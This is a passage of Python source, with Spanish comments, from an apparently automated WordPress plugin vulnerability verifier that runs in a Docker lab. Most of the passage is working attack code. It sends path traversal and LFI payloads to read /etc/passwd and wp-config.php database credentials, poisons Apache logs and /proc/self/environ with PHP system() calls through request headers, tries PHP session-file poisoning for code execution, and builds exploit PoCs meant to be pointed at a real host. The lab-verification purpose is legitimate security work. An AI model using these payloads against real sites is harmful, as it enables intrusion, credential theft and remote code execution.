                                f"Payload: {path_param}={payload_value!r}"))
                if m == "GET" and not follow_url:
                    shot_url = (boot.base_url + endpoint
                               + ("&" if "?" in endpoint else "?")
                               + f"{path_param}={payload_value}")
                    boot.capture(_pt_sess, shot_url[len(boot.base_url):],
                           "Paso 5b: PATH TRAVERSAL (navegador) — secreto visible.",
                           "Step 5b: PATH TRAVERSAL (browser) — secret visible.")
                break
        # ultimo recurso si el canario (en /tmp, fuera del volumen web) no se confirmo: repetir
        # las mismas 40 variantes pero pidiendo literalmente /etc/passwd -- el objetivo EXACTO
        # que demuestra el PoC publico ya divulgado de esta CVE. Universal en cualquier Linux,
        # sin permisos especiales para leerlo (0644, cualquier usuario), asi que si esto SI
        # devuelve la firma inequivoca de /etc/passwd y el canario no, aisla el problema a algo
        # especifico del fichero/ruta del canario (o de como se plantea), no del endpoint en si.
        tried_passwd = []
        if not found:
            step("el canario no se confirmo -- probando tambien con /etc/passwd literal (el "
                 "mismo objetivo que demuestra el PoC publico ya divulgado, para aislar si el "
                 "problema es del canario o del endpoint)...")
            passwd_attempts = ["etc/passwd", "/etc/passwd"]
            passwd_attempts += [("../" * n) + "etc/passwd" for n in depths]
            passwd_attempts += [("..%2f" * n) + "etc/passwd" for n in depths]
            for payload_value in passwd_attempts:
                payload = (dict(parameters) if isinstance(parameters, dict)
                          else dict.fromkeys(parameters or [], ""))
                payload[path_param] = payload_value
                step(f"probando {m} {endpoint} con {path_param}={payload_value!r} "
                     f"(/etc/passwd)...")
                try:
                    resp = _pt_sess.request(m, boot.base_url + endpoint,
                                       data=payload if m != "GET" else None,
                                       params=payload if m == "GET" else None, timeout=20)
                except Exception as e:
                    tried_passwd.append({"payload": payload_value, "error": str(e)})
                    continue
                body = resp.text or ""
                followed_body, follow_url = body, None
                if not _PASSWD_SIGNATURE_RE.search(body):
                    for candidate in _extract_followable_urls(body, boot.base_url):
                        try:
                            candidate_resp = boot.sub_sess.request("GET", candidate, timeout=20)
                        except Exception:
                            continue
                        if _PASSWD_SIGNATURE_RE.search(candidate_resp.text or ""):
                            followed_body, follow_url = candidate_resp.text, candidate
                            break
                tried_passwd.append({"payload": payload_value, "status": resp.status_code,
                                     "passwd_signature_presente": bool(
                                         _PASSWD_SIGNATURE_RE.search(followed_body)),
                                     "respuesta_cuerpo_recorte": body[:300]})
                if _PASSWD_SIGNATURE_RE.search(followed_body):
                    found = True
                    res.evidence["payload_ganador"] = payload_value
                    res.evidence["objetivo_ganador"] = "/etc/passwd"
                    if follow_url:
                        res.evidence["url_seguida"] = follow_url
                    res.evidence["respuesta_cuerpo_recorte"] = followed_body[:500]
                    step((f"VERIFICADO: /etc/passwd aparecio literal en la respuesta con "
                         f"{path_param}={payload_value!r} (via {follow_url})" if follow_url else
                         f"VERIFICADO: /etc/passwd aparecio literal en la respuesta con "
                         f"{path_param}={payload_value!r}."))
                    _capture_exploit_shot(
                        boot, m, endpoint, followed_body[:6000],
                        highlight="root:x:0:0",
                        caption_es=(f"Paso 5 (CLAVE): PATH TRAVERSAL CONFIRMADO — /etc/passwd devuelto. "
                                    f"Payload: {path_param}={payload_value!r}"),
                        caption_en=(f"Step 5 (KEY): PATH TRAVERSAL CONFIRMED — /etc/passwd returned. "
                                    f"Payload: {path_param}={payload_value!r}"))
                    if m == "GET" and not follow_url:
                        _pt_params_b = dict(base_params)
                        _pt_params_b[path_param] = payload_value
                        _shot_url_b = (boot.base_url + endpoint
                                       + ("&" if "?" in endpoint else "?")
                                       + f"{path_param}={payload_value}")
                        boot.capture(_pt_sess, _shot_url_b[len(boot.base_url):],
                               "Paso 5b: PATH TRAVERSAL (navegador) — /etc/passwd visible.",
                               "Step 5b: PATH TRAVERSAL (browser) — /etc/passwd visible.")
                    break
            res.evidence["intentos_etc_passwd"] = tried_passwd
        # wp-config.php probe: proves DB credential disclosure — higher impact than /etc/passwd
        # and unique to WordPress targets.  Run only if neither canary nor passwd succeeded and
        # there is budget left.  Any of the three DB_ constants in the response confirms the read.
        tried_wpconfig: list = []
        _WPCONFIG_SIGNATURE_RE = re.compile(
            r"(DB_(?:NAME|USER|PASSWORD|HOST)|define\s*\(\s*['\"]DB_)", re.I)
        if not found and (time.time() - t0) < budget_s - 30:
            step("canario y /etc/passwd no se confirmaron -- probando wp-config.php "
                 "(prueba DB credential disclosure directa)...")
            _wpcfg_targets = [
                "wp-config.php", "/wp-config.php",
                # traversals at standard WordPress depths
                *[("../" * n) + "wp-config.php" for n in depths],
                *[("..%2f" * n) + "wp-config.php" for n in depths[:4]],
                *[("....//" * n) + "wp-config.php" for n in depths[:4]],
            ]
            for _wpc_pv in _wpcfg_targets:
                _wpc_payload = dict(base_params)
                _wpc_payload[path_param] = _wpc_pv
                step(f"probando {m} {endpoint} con {path_param}={_wpc_pv!r} (wp-config.php)...")
                try:
                    _wpc_resp = _pt_sess.request(
                        m, boot.base_url + endpoint,
                        data=_wpc_payload if m != "GET" else None,
                        params=_wpc_payload if m == "GET" else None, timeout=20)
                except Exception as _wpc_e:
                    tried_wpconfig.append({"payload": _wpc_pv, "error": str(_wpc_e)})
                    continue
                _wpc_body = _wpc_resp.text or ""
                # Also decode any base64-encoded field in the response
                if not _WPCONFIG_SIGNATURE_RE.search(_wpc_body):
                    import base64 as _b64_wpc, re as _re_wpc
                    for _b64c in _re_wpc.findall(r'[A-Za-z0-9+/]{24,}={0,2}', _wpc_body):
                        try:
                            _dec = _b64_wpc.b64decode(_b64c + "==").decode("utf-8", errors="ignore")
                            if _WPCONFIG_SIGNATURE_RE.search(_dec):
                                _wpc_body = _dec
                                break
                        except Exception:
                            pass
                tried_wpconfig.append({
                    "payload": _wpc_pv, "status": _wpc_resp.status_code,
                    "wpconfig_sig": bool(_WPCONFIG_SIGNATURE_RE.search(_wpc_body)),
                    "respuesta_cuerpo_recorte": (_wpc_resp.text or "")[:300],
                })
                if _WPCONFIG_SIGNATURE_RE.search(_wpc_body):
                    found = True
                    res.evidence["payload_ganador"] = _wpc_pv
                    res.evidence["objetivo_ganador"] = "wp-config.php"
                    res.evidence["respuesta_cuerpo_recorte"] = _wpc_body[:500]
                    step(f"VERIFICADO: wp-config.php devuelto con {path_param}={_wpc_pv!r} "
                         f"(DB credentials en la respuesta)")
                    _capture_exploit_shot(
                        boot, m, endpoint, _wpc_resp,
                        highlight="DB_PASSWORD",
                        caption_es=(f"PATH TRAVERSAL CONFIRMADO — wp-config.php leido. "
                                    f"Payload: {path_param}={_wpc_pv!r}"),
                        caption_en=(f"PATH TRAVERSAL CONFIRMED — wp-config.php read. "
                                    f"Payload: {path_param}={_wpc_pv!r}"))
                    break
            res.evidence["intentos_wp_config"] = tried_wpconfig
        res.evidence["intentos_etc_passwd"] = tried_passwd
        res.evidence["intentos"] = tried
        if found and res.evidence.get("objetivo_ganador") == "wp-config.php":
            res.verified = True
            res.ok = True
            _pt_params_wpc = dict(base_params)
            _pt_params_wpc[path_param] = res.evidence["payload_ganador"]
            res.exploit_poc = _build_exploit_poc(
                base_url=boot.base_url, endpoint=endpoint, method=m,
                params=_pt_params_wpc, technique="path-traversal",
                description=(f"Path traversal on '{path_param}': wp-config.php returned — "
                              f"DB credentials exposed. Replace TARGET with the real host."))
            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
                          f"{res.evidence['payload_ganador']!r} devolvio wp-config.php "
                          f"con DB credentials (DB_NAME/DB_USER/DB_PASSWORD/DB_HOST)")
        elif found and res.evidence.get("objetivo_ganador") == "/etc/passwd":
            res.verified = True
            res.ok = True
            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
                          f"{res.evidence['payload_ganador']!r} devolvio /etc/passwd literal "
                          f"(el canario propio no se confirmo, pero /etc/passwd -- el objetivo "
                          f"exacto del PoC publico -- si; el traversal es real, algo especifico "
                          f"del canario/su ruta lo bloqueaba)")
            _pt_params = dict(base_params); _pt_params[path_param] = res.evidence["payload_ganador"]
            res.exploit_poc = _build_exploit_poc(
                base_url=boot.base_url, endpoint=endpoint, method=m,
                params=_pt_params, technique="path-traversal",
                description=f"Path traversal on '{path_param}': /etc/passwd returned in response. Replace TARGET with the real host.")
        elif found:
            res.verified = True
            res.ok = True
            _pt_params = dict(base_params); _pt_params[path_param] = res.evidence["payload_ganador"]
            res.exploit_poc = _build_exploit_poc(
                base_url=boot.base_url, endpoint=endpoint, method=m,
                params=_pt_params, technique="path-traversal",
                description=f"Path traversal on '{path_param}': secret file content leaked. Replace TARGET with the real host.")
            _used_canary = (php_canary_path if (php_secret and php_secret in
                            (res.evidence.get("respuesta_cuerpo_recorte") or ""))
                           else canary_path)
            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
                          f"{res.evidence['payload_ganador']!r} devolvio el secreto exacto "
                          f"plantado en {_used_canary} (fuera del directorio web)")
        else:
            res.ok = True
            # el cuerpo real del PRIMER intento (la ruta absoluta sin tocar, la mas simple de
            # las 40 -- si el endpoint no sanea nada, es la que mas deberia parecerse a lo que
            # el PoC publico ya demostro) es la pista mas util para diagnosticar un negativo sin
            # tener que repetir el ataque a mano ni leer el codigo del plugin: un error de la
            # propia app (p.ej. "File is not moved") apunta a algo del servidor (permisos del
            # fichero canario, una ruta que la app rechaza...), no a que el payload sea el
            # equivocado.
            sample = next((t.get("respuesta_cuerpo_recorte") for t in tried
                          if t.get("respuesta_cuerpo_recorte")), "")
            res.evidence["respuesta_muestra_primer_intento"] = sample
            res.detail = (f"se probaron {len(tried)} variantes de ruta para {path_param} y "
                          f"ninguna devolvio el secreto plantado, ni /etc/passwd literal -- el "
                          f"traversal no se confirmo (puede necesitar otra profundidad de "
                          f"'../', otra codificacion, o el endpoint/parametro no son los reales)" +
                          (f". Respuesta real del primer intento: {sample!r}" if sample else ""))
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        # --- LFI param fuzzing ---
        # If traversal failed, try other path-hint params that haven't been attempted yet.
        # Uses the same running lab for zero extra startup cost. Caps at 3 extra params.
        if (not res.verified and parameters
                and (_tried_params_set is None or len(_tried_params_set) < 4)):
            _already_tried_lfi = (_tried_params_set or frozenset()) | {path_param}
            _lfi_param_names = (list(parameters.keys()) if isinstance(parameters, dict)
                                else list(parameters))
            _lfi_candidates = []
            for _lfi_h in _PATH_HINTS:
                for _lfi_pn in _lfi_param_names:
                    if (_lfi_h in _lfi_pn.lower() and _lfi_pn not in _already_tried_lfi
                            and _lfi_pn not in _lfi_candidates):
                        _lfi_candidates.append(_lfi_pn)
            if _lfi_candidates:
                _lfi_next = _lfi_candidates[0]
                _lfi_budget_rem = max(60.0, budget_s - (time.time() - t0))
                step(f"LFI param fuzzing: '{path_param}' sin canario; "
                     f"probando siguiente candidato '{_lfi_next}'...")
                _lfi_rot = verify_wordpress_path_traversal(
                    plugin_source_dir, slug, endpoint, http_method,
                    parameters, path_param_hint=_lfi_next,
                    on_step=on_step, budget_s=_lfi_budget_rem,
                    companion_plugins=companion_plugins,
                    extra_nonce_pages=extra_nonce_pages,
                    extra_setup_trigger_paths=extra_setup_trigger_paths,
                    shortcode_name=shortcode_name,
                    keep_lab_on_failure=False,
                    _tried_params_set=_already_tried_lfi,
                    _live_boot=boot,  # reuse running lab — no extra Docker cost
                )
                if _lfi_rot.verified:
                    return _lfi_rot
        if not res.verified:
            res.confidence = "inconclusive"
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        res.confidence = "not_reproducible"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        res.confidence = "not_reproducible"
        return res
    finally:
        if _owns_boot:
            _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_lfi(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, path_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
    _tried_params_set: Optional[frozenset] = None,
    _live_boot: Optional["_LabSession"] = None,
) -> WpVerifyResult:
    """Verifica Local File Inclusion (LFI) en plugins de WordPress.

    Dos niveles de gravedad probados en orden:
    1. LFI de lectura: el parametro incluye /etc/passwd o wp-config.php y el
       contenido aparece en la respuesta (patron 'root:x:0:0' o 'DB_HOST').
    2. LFI-a-RCE via log poisoning: se envenena el log de acceso de Apache con
       '<?php system("echo MARKER"); ?>' y luego se incluye ese log via el
       parametro -- si el marcador aparece EJECUTADO (sin las etiquetas PHP
       alrededor), es ejecucion remota de codigo real, no solo lectura."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
    if not path_param:
        # fallback: primer param que no sea WP infra (action/nonce/security/_wpnonce) — cubre
        # plugins LFI cuyo param no está en _PATH_HINTS (ej. sogrid 'file', wp-umbrella 'path',
        # chartify 'source'). Sin filtrar infra, 'action' sería elegido antes que 'source'.
        _WP_INFRA_PARAMS_LFI = frozenset({"action", "nonce", "security", "_wpnonce", "_nonce",
                                          "wp_nonce", "ajax_nonce", "verify", "token"})
        _params_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
        _non_infra = [p for p in _params_list if p.lower() not in _WP_INFRA_PARAMS_LFI]
        if _non_infra:
            path_param = _non_infra[0]
        elif _params_list:
            path_param = _params_list[0]
        # Last resort: static analysis of PHP source for file-read sinks
        if not path_param and plugin_source_dir:
            path_param = _detect_lfi_param_from_source(plugin_source_dir) or ""
        if not path_param:
            res.detail = "no se identifico el parametro que lleva la ruta/fichero a incluir"
            res.limitations.append(
                "la verificacion de LFI necesita saber que parametro lleva la ruta; "
                "afina 'parameters' en la hipotesis del LLM o pasalo a mano (path_param_hint)")
            return res
    # Normalizar variantes de placeholder URL_PATH que el LLM genera mal
    # (ej. 'URL_PAT', 'URLPAT', 'urlpath', 'url_path') → canonical 'URL_PATH'
    if re.match(r'^url.?p(?:at(?:h)?|ath)$', path_param, re.IGNORECASE):
        path_param = "URL_PATH"

    lab = _Lab(_token())
    boot = None
    _owns_boot = _live_boot is None
    try:
        if _live_boot is not None:
            boot = _live_boot
        else:
            boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                                  companion_plugins=companion_plugins,
                                  shortcode_name=shortcode_name)
            if boot is None:
                return res

        m = (http_method or "GET").upper()
        # Normalizar endpoint: extraer params del query string del propio endpoint
        # (ej. sogrid: '?tab=FILEHERE') para evitar duplicados en la URL de ataque.
        if "?" in (endpoint or ""):
            from urllib.parse import urlparse, parse_qs
            _ep_parsed = urlparse(endpoint)
            _ep_qs_params = parse_qs(_ep_parsed.query, keep_blank_values=True)
            _WORD_PLACEHOLDER_RE_LFI = re.compile(r'^[A-Z_]+(?:HERE|THERE|PAYLOAD|INJECT|PLACEHOLDER)$')
            _TRAVERSAL_RE_LFI = re.compile(r'\.\.[\\/]|%2e%2e|%252e')
            _parameters_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
            for _qk, _qv in _ep_qs_params.items():
                _orig_v = _qv[0] if _qv else ""
                _vl_up = _orig_v.upper()
                _is_word_placeholder_lfi = (_WORD_PLACEHOLDER_RE_LFI.match(_vl_up) or
                                             _vl_up in {"FILEHERE", "PAYLOAD", "INJECT", ""})
                _is_traversal_payload_lfi = bool(_TRAVERSAL_RE_LFI.search(_orig_v))
                if _qk not in _parameters_list:
                    _inject_as_empty = _is_word_placeholder_lfi or _is_traversal_payload_lfi
                    _new_val = "" if _inject_as_empty else _orig_v
                    if isinstance(parameters, dict):
                        parameters = dict(parameters)
                        parameters[_qk] = _new_val
                    else:
                        _parameters_list.append(_qk)
                        parameters = dict.fromkeys(_parameters_list, "")
                        if not _inject_as_empty:
                            parameters[_qk] = _orig_v
            endpoint = _ep_parsed.path

        # Si path_param (de hint o _PATH_HINTS) no existe en parameters tras QS normalization,
        # usar el primer param placeholder extraido de la QS del endpoint.
        _params_dict_lfi = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        if path_param not in _params_dict_lfi:
            _qs_ph_lfi = [k for k, v in _params_dict_lfi.items() if v == ""]
            if _qs_ph_lfi:
                _old_pp_lfi = path_param
                path_param = _qs_ph_lfi[0]
                step(f"path_param ajustado: '{_old_pp_lfi}' no esta en parameters tras QS norm -- "
                     f"usando '{path_param}' (extraido de la QS del endpoint)")
        # Fix 19: si endpoint es fichero PHP directo del plugin, redirigir a ruta admin real.
        _ep_norm_lfi_lc = (endpoint or "").lstrip("/").lower()
        if ("wp-content/plugins/" in _ep_norm_lfi_lc and
                "wp-admin" not in _ep_norm_lfi_lc and
                "wp-json" not in _ep_norm_lfi_lc and
                plugin_source_dir and
                os.path.isdir(plugin_source_dir)):
            import re as _re_menu19_lfi
            _grep19_lfi = subprocess.run(
                ["grep", "-rh", "add_menu_page", plugin_source_dir,
                 "--include=*.php", "-A4", "-m5"],
                capture_output=True, text=True, timeout=10)
            _slug19_lfi_m = _re_menu19_lfi.search(
                r"add_menu_page\s*\([^,]+,[^,]+,[^,]+,\s*['\"]([^'\"]+)['\"]",
                _grep19_lfi.stdout or "")
            if _slug19_lfi_m:
                _admin_slug19_lfi = _slug19_lfi_m.group(1)
                if isinstance(parameters, dict):
                    parameters = dict(parameters)
                    parameters["page"] = _admin_slug19_lfi
                else:
                    parameters = dict.fromkeys(parameters or [], "")
                    parameters["page"] = _admin_slug19_lfi
                _params_dict_lfi = parameters
                endpoint = "/wp-admin/admin.php"
                step(f"endpoint es fichero PHP directo del plugin; acceso directo falla sin "
                     f"WordPress -- redirigiendo a /wp-admin/admin.php?page={_admin_slug19_lfi}")

        # ficheros objetivo: /etc/passwd (prueba clasica, siempre existe en Linux) y
        # wp-config.php (credenciales de BD, muy relevante en contexto WordPress).
        # Se prueban profundidades de traversal 0..12 con y sin URL-encoding del "../".
        targets = [
            # (ruta, patron_regex_en_respuesta)
            ("/etc/passwd", re.compile(r"root:x:0:0|daemon:x:1:1|bin:x:2:")),
            ("wp-config.php", re.compile(r"DB_HOST|DB_PASSWORD|DB_NAME|define\s*\(")),
        ]
        traversal_prefixes = [
            "", "../", "../../", "../../../", "../../../../",
            "../../../../../", "../../../../../../",
            "../../../../../../../", "../../../../../../../../",
            # variantes URL-encoded del "../"
            "%2e%2e%2f", "%2e%2e%2f%2e%2e%2f", "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            # null-byte (entornos con PHP < 5.3.4)
            "../../../etc/passwd\x00",
            "....//....//....//etc/passwd",
        ]

        # auto-seleccionar sesion correcta: endpoints bajo /wp-admin/ o admin-ajax.php
        # requieren admin; el resto funciona con subscriber
        _ep_lower_lfi = (endpoint or "").lower()
        _lfi_needs_admin = ("/wp-admin/" in _ep_lower_lfi or
                            "admin-ajax.php" in _ep_lower_lfi or
                            _ep_lower_lfi.startswith("wp-admin/"))
        _lfi_sess = boot.admin_sess if (_lfi_needs_admin and boot.admin_sess) else boot.sub_sess
        if _lfi_needs_admin and boot.admin_sess:
            step("endpoint bajo /wp-admin/ -- usando sesion de admin para LFI")

        # ── base64 JSON parameter detection ──────────────────────────────
        # Algunos plugins (ej. Swift Performance Lite) codifican la ruta como base64(JSON):
        # data=base64('["template-part","null","PATH"]'). Detectar y envolver cada payload.
        import base64 as _b64_lfi
        import json as _json_lfi
        _params_lfi_dict = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        _orig_lfi_val = _params_lfi_dict.get(path_param, "")
        _b64_lfi_template = None
        _b64_lfi_path_idx = 0
        if isinstance(_orig_lfi_val, str) and _orig_lfi_val:
            try:
                _decoded_lfi = _b64_lfi.b64decode(_orig_lfi_val + "==").decode("utf-8", errors="strict")
                _parsed_lfi = _json_lfi.loads(_decoded_lfi)
                if isinstance(_parsed_lfi, list) and len(_parsed_lfi) >= 2:
                    for _pi_lfi, _pv_lfi in enumerate(_parsed_lfi):
                        if isinstance(_pv_lfi, str) and (".." in _pv_lfi or "/" in _pv_lfi):
                            _b64_lfi_template = list(_parsed_lfi)
                            _b64_lfi_path_idx = _pi_lfi
                            break
            except Exception:
                pass

        def _wrap_lfi_path(p: str) -> str:
            if _b64_lfi_template is not None:
                _t = list(_b64_lfi_template)
                _t[_b64_lfi_path_idx] = p
                return _b64_lfi.b64encode(_json_lfi.dumps(_t, separators=(",", ":")).encode()).decode()
            return p

        if _b64_lfi_template is not None:
            step(f"[LFI] path_param='{path_param}' contiene JSON base64 (idx {_b64_lfi_path_idx}): "
                 f"cada payload sera codificado como base64(JSON)")

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user,
            "login_bajo_privilegio_password": boot.sub_pass,
            "path_param": path_param, "metodo": m, "endpoint": endpoint,
        })

        # ── nivel 1: LFI de lectura ──────────────────────────────────────
        read_found = False
        read_tried = []
        for rel_path, pattern in targets:
            if read_found:
                break
            for prefix in traversal_prefixes:
                payload_val = _wrap_lfi_path(prefix + rel_path.lstrip("/"))
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                payload[path_param] = payload_val
                step(f"probando LFI de lectura: {path_param}={payload_val!r}...")
                try:
                    resp = _lfi_sess.request(
                        m, boot.base_url + endpoint, timeout=20,
                        data=payload if m != "GET" else None,
                        params=payload if m == "GET" else None)
                except Exception as e:
                    read_tried.append({"payload": payload_val, "error": str(e)})
                    continue
                text = resp.text or ""
                match = bool(pattern.search(text))
                entry = {"payload": payload_val, "status": resp.status_code, "patron_encontrado": match}
                read_tried.append(entry)
                if match:
                    read_found = True
                    res.evidence["lfi_lectura_payload"] = payload_val
                    res.evidence["lfi_lectura_status"] = resp.status_code
                    res.evidence["lfi_lectura_fragmento"] = text[:400]
                    res.evidence["lfi_lectura_fichero"] = rel_path
                    step(f"LFI DE LECTURA confirmado: {path_param}={payload_val!r} devolvio "
                         f"contenido de '{rel_path}' (patron encontrado en la respuesta).")
                    boot.capture(boot.sub_sess, endpoint + "?" + path_param + "=" + payload_val
                                 if m == "GET" else endpoint,
                                 f"LFI de lectura: '{rel_path}' incluido via {path_param}",
                                 f"LFI read: '{rel_path}' included via {path_param}")
                    break
        res.evidence["lfi_lectura_intentos"] = read_tried

        # ── nivel 1b: PHP-canary (require_once/include con sufijo .php hardcoded) ───
        # Cubre casos como require_once __DIR__.'/tabs/'.$tab.'.php': PHP añade .php
        # al path → el canario .txt nunca aparece. Solución: plantar /tmp/TOKEN.php
        # con <?php echo 'SECRET'; ?> y sondear SIN extension (PHP añade .php sola).
        php_canary_found = False
        php_canary_tried = []
        if not read_found and time.time() - t0 < budget_s - 60:
            _php_lfi_secret = secrets.token_hex(16)
            _php_lfi_token = _token()
            _php_lfi_path = f"/tmp/binoracle_canary_{_php_lfi_token}.php"
            step(f"plantando canario PHP en {_php_lfi_path} para PHP-include con sufijo .php...")
            _php_lfi_ok = boot.lab.write_canary(_php_lfi_path, f"<?php echo '{_php_lfi_secret}'; ?>")
            if _php_lfi_ok:
                # Canario sin extension — PHP añade .php: /tmp/binoracle_canary_TOKEN
                _php_lfi_bare = f"tmp/binoracle_canary_{_php_lfi_token}"
                for _n_lfi in range(1, 13):
                    _php_lfi_val = _wrap_lfi_path(("../" * _n_lfi) + _php_lfi_bare)
                    _php_pl = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                    _php_pl[path_param] = _php_lfi_val
                    step(f"probando PHP-include canario: {path_param}={_php_lfi_val!r}...")
                    try:
                        _php_lfi_resp = _lfi_sess.request(
                            m, boot.base_url + endpoint, timeout=20,
                            data=_php_pl if m != "GET" else None,
                            params=_php_pl if m == "GET" else None)
                        _php_lfi_text = _php_lfi_resp.text or ""
                        _php_lfi_hit = _php_lfi_secret in _php_lfi_text
                        php_canary_tried.append({"payload": _php_lfi_val, "status": _php_lfi_resp.status_code, "hit": _php_lfi_hit})
                        if _php_lfi_hit:
                            php_canary_found = True
                            res.evidence["lfi_php_canary_payload"] = _php_lfi_val
                            res.evidence["lfi_php_canary_fragmento"] = _php_lfi_text[:400]
                            step(f"PHP-INCLUDE LFI confirmado: {path_param}={_php_lfi_val!r} "
                                 f"ejecuto el canario PHP (secreto encontrado en la respuesta).")
                            break
                    except Exception as _e:
                        php_canary_tried.append({"payload": _php_lfi_val, "error": str(_e)})
            res.evidence["lfi_php_canary_intentos"] = php_canary_tried

        # ── nivel 2: LFI-a-RCE via envenenamiento del log de Apache ─────
        # Solo se intenta si Docker esta disponible (el lab ya lo usa) y no ha
        # expirado el budget. Se prueba independientemente del nivel 1 -- si
        # solo la lectura fue confirmada el RCE puede seguir funcionando.
        rce_found = False
        rce_tried = []
        if time.time() - t0 < budget_s - 90:
            marker = f"binoracle_lfi_{_token()}"
            poison_ua = f"<?php system('echo {marker}'); ?>"
            step(f"envenenando log de Apache con PHP en User-Agent (marcador {marker!r})...")
            try:
                import requests as _requests
                _requests.get(boot.base_url + "/", headers={"User-Agent": poison_ua}, timeout=10)
                # /proc/self/environ also reflects X-Forwarded-For; cover configs that strip UA
                _requests.get(boot.base_url + "/", headers={"X-Forwarded-For": poison_ua}, timeout=10)
                time.sleep(1)
            except Exception:
                pass

            # /proc/self/environ is always present in Docker and reflects HTTP_USER_AGENT
            # (and HTTP_X_FORWARDED_FOR) from the current request's environment — no log
            # files needed. Apache Docker images pipe access logs to stdout/stderr, so the
            # classic /var/log/apache2/access.log paths often don't exist on disk.
            log_paths = [
                "/proc/self/environ",        # reflects HTTP_USER_AGENT immediately
                "/proc/self/fd/2",           # stderr — Apache error log fd in Docker
                "/proc/self/fd/1",           # stdout — Apache access log fd in Docker
                "/var/log/apache2/error.log",
                "/var/log/apache2/access.log",
                "/var/log/apache2/other_vhosts_access.log",
                "/var/log/httpd/access_log",
                "/usr/local/apache2/logs/access_log",
                "/var/log/php_errors.log",   # PHP error log (if log_errors=On)
                "/tmp/php_errors.log",
            ]
            depths = (0, 4, 8)
            log_payloads = []
            for lp in log_paths:
                rel = lp.lstrip("/")
                for n in depths:
                    log_payloads.append(("../" * n + rel) if n else lp)

            for lp_val in [_wrap_lfi_path(p) for p in log_payloads]:
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                payload[path_param] = lp_val
                step(f"incluyendo log envenenado: {path_param}={lp_val!r}...")
                try:
                    resp = boot.sub_sess.request(
                        m, boot.base_url + endpoint, timeout=20,
                        data=payload if m != "GET" else None,
                        params=payload if m == "GET" else None)
                except Exception as e:
                    rce_tried.append({"payload": lp_val, "error": str(e)})
                    continue
                text = resp.text or ""
                # EJECUTADO = marcador presente SIN etiquetas PHP alrededor
                executed = marker in text and "<?php" not in text
                raw_reflected = marker in text and "<?php" in text
                entry = {"payload": lp_val, "status": resp.status_code,
                         "ejecutado": executed, "reflejado_crudo": raw_reflected}
                rce_tried.append(entry)
                if executed:
                    rce_found = True
                    res.evidence["lfi_rce_payload"] = lp_val
                    res.evidence["lfi_rce_fragmento"] = text[:400]
                    step(f"LFI-A-RCE confirmado: log {lp_val!r} incluido y el marcador "
                         f"'{marker}' aparecio EJECUTADO (no como PHP crudo).")
                    break
            res.evidence["lfi_rce_intentos"] = rce_tried

        # ── nivel 3: LFI-a-RCE via PHP session file poisoning ────────────
        # If log poisoning didn't work and there's a PHP session, try poisoning
        # the session file — set a session var to PHP code, then include it.
        if not rce_found and time.time() - t0 < budget_s - 60:
            try:
                _sess_marker = f"binoracle_sess_{_token()}"
                _sess_php = f"<?php system('echo {_sess_marker}'); ?>"
                # First: get a PHP session by logging in (we have sub_sess which is already logged in)
                # The session file will be at /var/lib/php/sessions/sess_<id> or /tmp/sess_<id>
                _sess_id = None
                for _ck_name, _ck_val in boot.sub_sess.cookies.items():
                    if _ck_name.upper().startswith("PHPSESSID") or _ck_name == "PHPSESSID":
                        _sess_id = _ck_val
                        break
                if _sess_id:
                    # Poison: set a WordPress transient or option to our PHP payload
                    # (simpler: just include /var/lib/php/sessions/sess_X which may have
                    #  user-controlled values if the app stores request data in sessions)
                    _sess_paths = [
                        f"/var/lib/php/sessions/sess_{_sess_id}",
                        f"/var/lib/php/session/sess_{_sess_id}",
                        f"/tmp/sess_{_sess_id}",
                        f"/tmp/php/sessions/sess_{_sess_id}",
                    ]
                    for _sp in _sess_paths:
                        for _n in (0, 4, 8):
                            _sp_val = ("../" * _n + _sp.lstrip("/")) if _n else _sp
                            _sp_params = dict(
                                parameters if isinstance(parameters, dict)
                                else dict.fromkeys(parameters or [], ""))
                            _sp_params[path_param] = _sp_val
                            try:
                                _sp_resp = boot.sub_sess.request(
                                    m, boot.base_url + endpoint, timeout=10,
                                    data=_sp_params if m != "GET" else None,
                                    params=_sp_params if m == "GET" else None)
                                _sp_text = _sp_resp.text or ""
                                # Check if PHP marker appeared (session may contain username or user-agent)
                                if _sess_marker in _sp_text and "<?php" not in _sp_text:
                                    rce_found = True
                                    res.evidence["lfi_rce_payload"] = _sp_val
                                    res.evidence["lfi_rce_fragmento"] = _sp_text[:400]
                                    res.evidence["lfi_rce_technique"] = "session_poisoning"
                                    step(f"LFI-A-RCE via session poisoning confirmado: {_sp_val!r}")
                                    break
                            except Exception:
                                continue
                        if rce_found:
                            break
            except Exception:
                pass

        # ── veredicto ────────────────────────────────────────────────────
        _lfi_base_params = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        if rce_found:
            res.verified = True
            res.ok = True
            res.detail = (
                f"LFI-A-RCE confirmado (log poisoning): el log de acceso de Apache fue "
                f"envenenado con PHP y al incluirlo via {path_param}="
                f"{res.evidence['lfi_rce_payload']!r} el codigo SE EJECUTO de verdad "
